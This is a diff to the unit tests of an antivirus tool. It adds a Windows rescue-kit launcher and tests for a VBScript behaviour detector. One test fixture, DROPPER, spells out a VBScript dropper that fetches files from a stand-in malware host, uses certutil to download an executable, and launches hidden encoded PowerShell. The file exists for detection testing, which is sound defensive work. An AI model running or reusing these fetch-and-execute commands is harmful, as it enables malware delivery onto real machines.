@@ -2251,8 +2251,9 @@ class RescueKitTests(unittest.TestCase):
         base, kit, manifest = self._build()
         self.assertEqual(verify_kit(kit), [])
         self.assertGreaterEqual(manifest["signatures"]["count"], 1)
-        for name in ("run-rescue.py", "bootstrap.sh", "antivirus.zip",
-                     "signatures.json", "rescue-manifest.json"):
+        for name in ("run-rescue.py", "bootstrap.sh", "bootstrap.bat",
+                     "antivirus.zip", "signatures.json",
+                     "rescue-manifest.json"):
             self.assertTrue((kit / name).exists(), name)
         self.assertTrue((kit / "antivirus" / "__init__.py").exists())
         self.assertTrue((kit / "bootstrap.sh").stat().st_mode & 0o111)
@@ -2325,7 +2326,7 @@ class RescueKitTests(unittest.TestCase):
         mounted.mkdir()
         for name in ("antivirus.zip", "run-rescue.py", "signatures.json",
                      "rescue-manifest.json", "bootstrap.sh",
-                     "README-RESCUE.txt"):
+                     "bootstrap.bat", "README-RESCUE.txt"):
             shutil.copyfile(kit / name, mounted / name)
         self.assertEqual(verify_kit(mounted), [])
 
@@ -2504,6 +2505,158 @@ class RescueModuleTests(unittest.TestCase):
                                         (base / "kit") / "signatures.json"))
         self.assertEqual(len(info["result"].findings), 1)
         self.assertFalse((disk / "e.txt").exists())
+
+
+class VbsBehaviorTests(unittest.TestCase):
+    """v2.1: the VBScript / Windows Script Host behaviour layer."""
+
+    DROPPER = (
+        "Set shell = CreateObject(\"WScript.Shell\")\n"
+        "Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
+        "http.Open \"GET\", \"http://malware-sample.example.com/s.bin\", "
+        "False\n"
+        "http.Send\n"
+        "shell.Run \"certutil -urlcache -f "
+        "http://malware-sample.example.com/d.exe\", 0\n"
+        "shell.Run \"powershell -nop -w 0 -enc SQBFAFgAIA==\", 0\n"
+    )
+
+    def _analyze(self, text, name="x.vbs"):
+        from antivirus.behavior import analyze_file
+
+        p = Path(name)
+        return analyze_file(p, None, text.encode())
+
+    def test_dropper_flagged(self):
+        findings = self._analyze(self.DROPPER)
+        names = {f.name for f in findings}
+        self.assertIn("Shell command execution", names)
+        self.assertIn("HTTP download", names)
+        self.assertIn("certutil URL download (LOLBin)", names)
+        self.assertIn("hidden PowerShell launched from script", names)
+        self.assertTrue(all(f.severity == "high" for f in findings))
+
+    def test_harmless_clean(self):
+        findings = self._analyze(
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+            "WScript.Echo \"done\" & Now()\n")
+        self.assertEqual(findings, [])
+
+    def test_vbe_encoded(self):
+        # real VBE files are "SSe" + base64 (always =-padded)
+        text = "SSe" + "QWVJREFRakFBRkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB="
+        names = {f.name for f in self._analyze(text)}
+        self.assertIn("VBE-encoded VBScript", names)
+
+    def test_wmi_and_dynamic_execute(self):
+        text = (
+            "Set w = GetObject(\"winmgmts:\\\\.\\\\root\\\\cimv2\")\n"
+            "w.ExecQuery(\"SELECT * FROM Win32_Process\")\n"
+            "x = Chr(65) & Chr(66)\n"
+            "Execute x\n"
+        )
+        names = {f.name for f in self._analyze(text)}
+        self.assertIn("WMI Win32_Process.Create (process creation)", names)
+        self.assertIn("Dynamic code execution", names)
+
+    def test_chained_dropper_from_samples(self):
+        from antivirus.samples import build_all_samples
+
+        base = Path(tempfile.mkdtemp(prefix="av-vbs-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        out = base / "samples"
+        build_all_samples(out)
+        self.assertTrue((out / "behavior" / "dropper.vbs").exists())
+        self.assertTrue((out / "behavior" / "harmless-vbs.vbs").exists())
+
+        import antivirus
+
+        cfg = antivirus.config.Config()
+        cfg.cache_enabled = False
+        from antivirus.scanner import Scanner
+        from antivirus.signatures import SignatureDB
+
+        db = SignatureDB(Path("data/signatures.json"))
+        sc = Scanner(cfg, db)
+        res = sc.scan_path(out)
+        dropper = [f for f in res.findings
+                   if f.path.endswith("dropper.vbs")]
+        harmless = [f for f in res.findings
+                    if f.path.endswith("harmless-vbs.vbs")]
+        self.assertGreaterEqual(len(dropper), 3)
+        self.assertEqual(harmless, [])
+
+
+class WindowsCompatTests(unittest.TestCase):
+    """v2.1: behaviour when running on (or simulating) Windows."""
+
+    def test_tui_fallback_without_curses(self):
+        # Simulate Windows, where CPython has no curses module.
+        import antivirus.tui as tui
+
+        old = tui.curses
+        tui.curses = None
+        try:
+            self.assertFalse(tui.tui_available())
+            err = io.StringIO()
+            with contextlib.redirect_stderr(err):
+                rc = tui.run_tui(None, target=".")
+            self.assertEqual(rc, 2)
+            self.assertIn("Windows", err.getvalue())
+        finally:
+            tui.curses = old
+
+    def test_exclude_glob_uses_posix_separators(self):
+        # --exclude 'build/*' must match nested paths regardless of the
+        # platform's native separator.
+        from antivirus.scanner import walk_files
+
+        base = Path(tempfile.mkdtemp(prefix="av-win-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        (base / "build").mkdir()
+        (base / "build" / "sub").mkdir(parents=True)
+        (base / "build" / "sub" / "x.log").write_text("x\n")
+        (base / "build" / "y.txt").write_text("y\n")
+        (base / "keep.txt").write_text("k\n")
+
+        seen = []
+        gen = walk_files(base, (), protected=(),
+                         on_file=lambda p, st: seen.append(p),
+                         on_skip=lambda p, r: None,
+                         exclude_patterns=["build/*"])
+        for _p in gen:  # consume the walk (callbacks fire during iteration)
+            pass
+        names = {p.name for p in seen}
+        self.assertIn("keep.txt", names)
+        self.assertNotIn("x.log", names)
+        self.assertNotIn("y.txt", names)
+
+    def test_baseline_keys_are_posix(self):
+        from antivirus.integrity import _hash_tree
+        from antivirus.config import Config
+
+        base = Path(tempfile.mkdtemp(prefix="av-wkey-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        (base / "a" / "b").mkdir(parents=True)
+        (base / "a" / "b" / "c.txt").write_text("hello\n")
+        files = _hash_tree(base, Config())
+        self.assertIn("a/b/c.txt", files)
+        self.assertNotIn(os.path.join("a", "b", "c.txt"),
+                         files if os.sep != "/" else {})
+
+    def test_rescue_kit_ships_windows_launcher(self):
+        from antivirus.rescue import build_rescue_kit
+
+        base = Path(tempfile.mkdtemp(prefix="av-wkit-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        kit = base / "kit"
+        manifest = build_rescue_kit(kit)
+        bat = kit / "bootstrap.bat"
+        self.assertTrue(bat.exists())
+        self.assertIn("bootstrap.bat", manifest["files"])
+        text = bat.read_text(encoding="utf-8")
+        self.assertIn("run-rescue.py", text)
+        self.assertIn("py -3", text)
 
 
 if __name__ == "__main__":
